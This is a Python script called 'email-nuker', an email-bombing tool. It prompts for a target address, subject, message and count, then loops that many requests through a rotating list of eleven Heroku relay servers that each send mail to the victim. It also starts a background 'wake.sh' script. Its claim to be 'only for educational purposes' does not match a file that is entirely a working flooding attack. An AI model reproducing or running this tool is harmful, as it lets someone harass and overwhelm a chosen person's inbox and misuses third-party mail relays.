import requests 
import random
import os 
import time
os.system("bash wake.sh &")
time.sleep(2)
os.system("clear")

print("\n")
print ("email-nuker version: 1.0.2")
print ("github: https://github.com/bagarrattaa/email-nuker ")
# print ("join the official discord server of email-nuker for latest updates !!")
# print("discord server invite link: https://discord.gg/79GRTGRP3m")
print("this tool is only for educational purposes")
to=str(input("enter target email to bomb "))
sub=str(input("enter subject "))
msg=str(input("enter message "))
msg=msg.replace(" ","%20")
sub=sub.replace(" ","%20")
srvrlist={1:"https://emailbomber-1.herokuapp.com",2:"https://emailbomber-2.herokuapp.com",3:"https://emailbomber-3.herokuapp.com",4:"https://emailbomber-4.herokuapp.com",5:"https://emailbomber-5.herokuapp.com",6:"https://emailbomber-6.herokuapp.com",7:"https://emailbomber-7.herokuapp.com",8:"https://emailbomber-8.herokuapp.com",9:"https://emailbomber-9.herokuapp.com",10:"https://emailbomber-10.herokuapp.com",11:"https://emailbomber-11.herokuapp.com"}
am=int(input("enter amount of msgs to send "))


for i in range(0,am): 
    # os.system("clear")
    srvr=random.randint(1,11)
    req=requests.get(srvrlist.get(srvr)+"/bomb/"+to+"/"+sub+"/"+msg)
    if req.text=="Sent": 
        print("           ")
        print (i+1)
    else: 
        print ("failed to send msg ")
        print("please report this error to developer ")
        print("the responce reseaved from the server was: "+str(srvr)+req.text)
        break
